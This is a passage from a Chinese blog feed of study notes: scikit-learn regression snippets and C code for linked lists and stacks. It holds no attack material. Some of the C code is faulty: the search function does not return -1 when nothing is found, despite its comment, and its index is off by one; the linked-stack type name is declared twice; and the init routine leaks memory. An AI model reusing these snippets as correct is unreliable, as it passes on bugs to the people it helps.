<h4 id="轮廓系数"><a href="#轮廓系数" class="headerlink" title="轮廓系数"></a>轮廓系数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">scores = []</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> silhouette_score</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">9</span>):</span><br><span class="line">    km = KMeans(k)</span><br><span class="line">    km.fit(data)</span><br><span class="line">    y_predict = km.predict(data)</span><br><span class="line">    scores.append(silhouette_score(data, y_predict))</span><br><span class="line">x = <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">9</span>)</span><br><span class="line">plt.figure()</span><br><span class="line">plt.xlabel(<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;score&#x27;</span>)</span><br><span class="line">plt.plot(x, scores, <span class="string">&#x27;o-&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>数学建模</tag>
        <tag>机器学习</tag>
        <tag>数据处理</tag>
      </tags>
  </entry>
  <entry>
    <title>回归代码</title>
    <url>/2023/03/01/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E5%9B%9E%E5%BD%92%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<h2 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h2><h3 id="正规方程"><a href="#正规方程" class="headerlink" title="正规方程"></a>正规方程</h3><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ol>
<li>当采用普通的线性回归的时候，是无需标准化的。因为标准化前后，不会影响线性回归预测值。</li>
<li>适合小数据规模，不能解决过拟合的问题</li>
</ol>
<h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"></span><br><span class="line">estimator = LinearRegression()</span><br><span class="line">estimator.fit(X_train, y_train)</span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h5 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 回归系数</span></span><br><span class="line">estimator.coef_</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">estimator.intercept_</span><br></pre></td></tr></table></figure>

<h3 id="梯度下降法"><a href="#梯度下降法" class="headerlink" title="梯度下降法"></a>梯度下降法</h3><h5 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h5><ol>
<li>SGDRegressor类实现了随机梯度下降学习，它支持不同的Ioss函数和正则化惩罚项来拟合线性回归模型。</li>
<li>适合大规模数据</li>
</ol>
<h5 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> SGDRegressor</span><br><span class="line"></span><br><span class="line">estimator = SGDRegressor()</span><br><span class="line">estimator.fit(X_train, y_train)</span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h5 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 损失函数</span></span><br><span class="line">	<span class="comment">#普通最小二乘法</span></span><br><span class="line">loss=”squared_loss”</span><br><span class="line"></span><br><span class="line"><span class="comment"># 惩罚力度</span></span><br><span class="line">penalty=<span class="string">&quot;l2&quot;</span></span><br><span class="line">	<span class="comment"># L2正则化</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 学习率（梯度下降强度）</span></span><br></pre></td></tr></table></figure>
<h5 id="属性-1"><a href="#属性-1" class="headerlink" title="属性"></a>属性</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 回归系数</span></span><br><span class="line">estimator.coef_</span><br><span class="line"></span><br><span class="line"><span class="comment"># 偏置</span></span><br><span class="line">estimator.intercept_</span><br></pre></td></tr></table></figure>
<h3 id="岭回归"><a href="#岭回归" class="headerlink" title="岭回归"></a>岭回归</h3><h4 id="注意-2"><a href="#注意-2" class="headerlink" title="注意"></a>注意</h4><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Ridge</span><br><span class="line"></span><br><span class="line">estimator = Ridge()</span><br><span class="line">estimator.fit(X_train, y_train)</span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># alpha:正则化力度，取值0~1，1~10</span></span><br><span class="line">alpha = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># solver:会根据数据自动选择优化方法 </span></span><br><span class="line">	<span class="comment"># sag:如果数据集、特征都比较大，选择该随机梯度下降优化</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># normalize:数据是否进行标准化 normalize:=False:</span></span><br><span class="line">	<span class="comment"># 可以在fit之前调用preprocessing.StandardScaler标准化数据</span></span><br></pre></td></tr></table></figure>
<h4 id="属性-2"><a href="#属性-2" class="headerlink" title="属性"></a>属性</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 回归系数</span></span><br><span class="line">estimator.coef_</span><br><span class="line"></span><br><span class="line"><span class="comment"># 偏置</span></span><br><span class="line">estimator.intercept_</span><br></pre></td></tr></table></figure>
<h3 id="Lasso回归"><a href="#Lasso回归" class="headerlink" title="Lasso回归"></a>Lasso回归</h3><h4 id="注意-3"><a href="#注意-3" class="headerlink" title="注意"></a>注意</h4><ol>
<li>模型现状：目前Lasso回归的使用率远高于岭回归，因此实际建模时推荐优先使用Lasso回归。</li>
<li>Lasso回归的最大优点：能够把不重要的自变量的回归系数压缩到零，从而起到很好的变量筛选作用。</li>
<li>Lasso回归的缺点：没有显式解，只能使用近似估计算法计算回归系数。</li>
<li>什么情况下进行Lasso回归：首先对原始模型进行多重共线性检验，如果存在多重共线性，那么就可以用Lasso回归进行自变量筛选并回归。</li>
</ol>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Lasso</span><br><span class="line"></span><br><span class="line">estimator = Lasso()</span><br><span class="line">estimator.fit(X_train, y_train)</span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h4 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alpha=<span class="number">1.0</span>, </span><br><span class="line">fit_intercept=<span class="literal">True</span>, </span><br><span class="line">normalize=<span class="literal">False</span>,</span><br><span class="line">precompute=<span class="literal">False</span>,</span><br><span class="line">copy_X=<span class="literal">True</span>,</span><br><span class="line">max_iter=<span class="number">1000</span>,</span><br><span class="line">tol=<span class="number">1e-4</span>, </span><br><span class="line">warm_start=<span class="literal">False</span>,</span><br><span class="line">positive=<span class="literal">False</span>,</span><br><span class="line">random_state=<span class="literal">None</span>,</span><br><span class="line">selection=<span class="string">&#x27;cyclic&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="属性-3"><a href="#属性-3" class="headerlink" title="属性"></a>属性</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 回归系数</span></span><br><span class="line">estimator.coef_</span><br><span class="line"></span><br><span class="line"><span class="comment"># 偏置</span></span><br><span class="line">estimator.intercept_</span><br></pre></td></tr></table></figure>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h2><h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeRegressor</span><br><span class="line"></span><br><span class="line">estimator = DecisionTreeRegressor()</span><br><span class="line">estimator.fit(X_train, y_train)</span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h2 id="集成学习"><a href="#集成学习" class="headerlink" title="集成学习"></a>集成学习</h2><h3 id="随机森林"><a href="#随机森林" class="headerlink" title="随机森林"></a>随机森林</h3><h4 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestRegressor</span><br><span class="line"></span><br><span class="line">estimator = RandomForestRegressor(random_state=<span class="number">15</span>)</span><br><span class="line">estimator.fit(X_train, y_train)</span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h3 id="AdaBoost"><a href="#AdaBoost" class="headerlink" title="AdaBoost"></a>AdaBoost</h3><h4 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> AdaBoostRegressor</span><br><span class="line"></span><br><span class="line">estimator = AdaBoostRegressor()</span><br><span class="line">estimator.fit(X_train, y_train)  </span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h3 id="ExtraTrees"><a href="#ExtraTrees" class="headerlink" title="ExtraTrees"></a>ExtraTrees</h3><h4 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> ExtraTreesRegressor</span><br><span class="line"></span><br><span class="line">estimator =  ExtraTreesRegressor()</span><br><span class="line">estimator.fit(X_train, y_train)  </span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h3 id="GBDT"><a href="#GBDT" class="headerlink" title="GBDT"></a>GBDT</h3><h4 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> GradientBoostingRegressor</span><br><span class="line"></span><br><span class="line">estimator = GradientBoostingRegressor()</span><br><span class="line">estimator.fit(X_train, y_train)  </span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h2 id="支持向量机"><a href="#支持向量机" class="headerlink" title="支持向量机"></a>支持向量机</h2><h3 id="SVR"><a href="#SVR" class="headerlink" title="SVR"></a>SVR</h3><h4 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVR</span><br><span class="line"></span><br><span class="line">estimator = SVR()</span><br><span class="line">estimator.fit(X_train, y_train)</span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h2 id="基于-GBDT框架的算法"><a href="#基于-GBDT框架的算法" class="headerlink" title="基于 GBDT框架的算法"></a>基于 GBDT框架的算法</h2><h3 id="XGBoost"><a href="#XGBoost" class="headerlink" title="XGBoost"></a>XGBoost</h3><h4 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> xgboost <span class="keyword">import</span> XGBRegressor</span><br><span class="line"></span><br><span class="line">estimator = XGBRegressor()</span><br><span class="line">estimator.fit(X_train, y_train)  </span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h3 id="LightGBM"><a href="#LightGBM" class="headerlink" title="LightGBM"></a>LightGBM</h3><h4 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lightgbm <span class="keyword">import</span> LGBMRegressor</span><br><span class="line"></span><br><span class="line">estimator = LGBMRegressor()</span><br><span class="line">estimator.fit(X_train, y_train)  </span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h3 id="CatBoost"><a href="#CatBoost" class="headerlink" title="CatBoost"></a>CatBoost</h3><h4 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> catboost <span class="keyword">import</span> CatBoostRegressor</span><br><span class="line"></span><br><span class="line">estimator =  CatBoostRegressor()</span><br><span class="line">estimator.fit(X_train, y_train)  </span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h2 id="BP神经网络"><a href="#BP神经网络" class="headerlink" title="BP神经网络"></a>BP神经网络</h2><h4 id="代码-13"><a href="#代码-13" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.neural_network <span class="keyword">import</span> MLPRegressor</span><br><span class="line"></span><br><span class="line">estimator = MLPRegressor()</span><br><span class="line">estimator.fit(X_train, y_train)  </span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>

<ol>
<li><p>$27 \leq \sum_{i&#x3D;1}^{n} x_i \leq 33$</p>
</li>
<li><p>$x_i \geq 2.5$</p>
</li>
</ol>
]]></content>
      <categories>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>数学建模</tag>
        <tag>机器学习</tag>
        <tag>数据处理</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构与算法分析(C++描述)</title>
    <url>/2023/03/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%90%86%E8%AE%BA/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90(C++%E6%8F%8F%E8%BF%B0)/</url>
    <content><![CDATA[<h1 id="数据结构与算法笔记-C-描述"><a href="#数据结构与算法笔记-C-描述" class="headerlink" title="数据结构与算法笔记(C++描述)"></a>数据结构与算法笔记(C++描述)</h1><h2 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h2><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><h4 id="链表的结构"><a href="#链表的结构" class="headerlink" title="链表的结构"></a>链表的结构</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> data;							<span class="comment">//数据域</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">node</span>* <span class="title">next</span>;</span>					<span class="comment">//指针域</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">node</span> <span class="title">node</span>;</span></span><br></pre></td></tr></table></figure>

<h4 id="链表的创建"><a href="#链表的创建" class="headerlink" title="链表的创建"></a>链表的创建</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个节点数为 N 的链表, 返回头节点的地址</span></span><br><span class="line">node* <span class="title function_">linkNodeCreat</span><span class="params">(<span class="type">int</span> N)</span><span class="comment">//尾插法</span></span><br><span class="line">&#123;</span><br><span class="line">	node* head = <span class="literal">NULL</span>;</span><br><span class="line">	node* p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">	p-&gt;data = N;</span><br><span class="line">	p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	head = p;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		node* p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;p-&gt;data);</span><br><span class="line">		p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//找到链表的尾巴</span></span><br><span class="line">		node* last = head;</span><br><span class="line">		<span class="keyword">while</span> (last-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">            last = last-&gt;next;</span><br><span class="line"></span><br><span class="line">		last-&gt;next = p;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> head-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="链表的打印"><a href="#链表的打印" class="headerlink" title="链表的打印"></a>链表的打印</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链表的打印</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">linkNodePrint</span><span class="params">(node* head)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (head == <span class="literal">NULL</span>) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;该链表没有节点&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (node* p = head; p != <span class="literal">NULL</span> ; p = p-&gt;next)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p-&gt;data);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="链表的查找"><a href="#链表的查找" class="headerlink" title="链表的查找"></a>链表的查找</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链表的查找, 返回查找元素的索引值, 没有找到返回-1</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">linkNodeFind</span><span class="params">(node* head,<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> index = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">for</span> (node* p = head; p != <span class="literal">NULL</span>; p = p-&gt;next)</span><br><span class="line">	&#123;</span><br><span class="line">		index++;</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;data == x)</span><br><span class="line">		&#123;</span><br><span class="line">			index++;</span><br><span class="line">			<span class="comment">//因为索引是从-1开始计数, 所以最后输出的时候要+1</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="链表的添加"><a href="#链表的添加" class="headerlink" title="链表的添加"></a>链表的添加</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链表的添加, x为添加节点的数据, index表示添加节点的索引, 返回头节点的地址</span></span><br><span class="line">node* <span class="title function_">linkNodeAdd</span><span class="params">(node* head, <span class="type">int</span> x, <span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">	node* temp = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">	temp-&gt;next = head;</span><br><span class="line">	head = temp;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//自己人为地添加头节点, 其中添加的头节点的数值域不包含任何数据</span></span><br><span class="line">	<span class="comment">//这样做可以减少判断头指针是否发生改动或者头指针为空的操作</span></span><br><span class="line">	<span class="comment">//最后返回的时候, 只要返回头节点的下一个节点就行了</span></span><br><span class="line"></span><br><span class="line">	node* p = head;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; index; p = p-&gt;next,i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;索引超出当前链表的最大长度\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	node* q = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">	q-&gt;data = x;</span><br><span class="line">	q-&gt;next = p-&gt;next;</span><br><span class="line"></span><br><span class="line">	p-&gt;next = q;</span><br><span class="line">	<span class="keyword">return</span> head-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="链表的删除"><a href="#链表的删除" class="headerlink" title="链表的删除"></a>链表的删除</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链表的删除, x为要删除节点的数据, 返回头节点的地址</span></span><br><span class="line">node* <span class="title function_">linkNodeRemove</span><span class="params">(node* head, <span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">	node* p = head;</span><br><span class="line">	head = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">	head-&gt;next = p;</span><br><span class="line">	<span class="comment">//添加头节点</span></span><br><span class="line">	<span class="comment">//理由和linkNodeAdd()一样, 不在解释</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//双指针法</span></span><br><span class="line">	<span class="comment">//p所指向的是原来链表的头节点</span></span><br><span class="line">	<span class="comment">//现在的链表的第二个节点</span></span><br><span class="line">	<span class="keyword">for</span> (node* q = head; p !=<span class="literal">NULL</span>; p = p-&gt;next,q = q-&gt;next)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;data == x)</span><br><span class="line">		&#123;</span><br><span class="line">		 	q-&gt;next = p-&gt;next;</span><br><span class="line">			<span class="built_in">free</span>(p);</span><br><span class="line">			<span class="keyword">return</span> head-&gt;next;<span class="comment">//返回头节点的下一个节点</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;没有找到指定元素\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> head-&gt;next;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><h4 id="栈的结构"><a href="#栈的结构" class="headerlink" title="栈的结构"></a>栈的结构</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序栈</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">stack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">int</span> data[MAXSIZE];  <span class="comment">//MAXSIZE为顺序栈的容量</span></span><br><span class="line">        <span class="type">int</span> top; <span class="comment">/* 用于栈顶指针 */</span></span><br><span class="line">&#125;SqStack;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链栈</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">stackNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">int</span> data;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">stackNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;stackNode,*LinkStack;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        LinkStack top;</span><br><span class="line">        <span class="type">int</span> count;</span><br><span class="line">&#125;LinkStack;</span><br></pre></td></tr></table></figure>

<h4 id="栈的建立"><a href="#栈的建立" class="headerlink" title="栈的建立"></a>栈的建立</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(SqStack *S)</span></span><br><span class="line">&#123; </span><br><span class="line">        S-&gt;top=<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(LinkStack *S)</span></span><br><span class="line">&#123; </span><br><span class="line">        S-&gt;top = new stackNode;</span><br><span class="line">        <span class="keyword">if</span>(!S-&gt;top)<span class="comment">//S-&gt;top为空，并未分配空间，退出</span></span><br><span class="line">        &#123;     </span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;内存分配失败&quot;</span>);</span><br><span class="line">             <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">         </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        S-&gt;top=<span class="literal">NULL</span>;<span class="comment">//栈顶指针指向空</span></span><br><span class="line">        S-&gt;count=<span class="number">0</span>;<span class="comment">//计数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="栈的清空"><a href="#栈的清空" class="headerlink" title="栈的清空"></a>栈的清空</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ClearStack</span><span class="params">(SqStack *S)</span></span><br><span class="line">&#123; </span><br><span class="line">        S-&gt;top=<span class="number">-1</span>;   <span class="comment">//顺序栈的清空与建栈相同</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

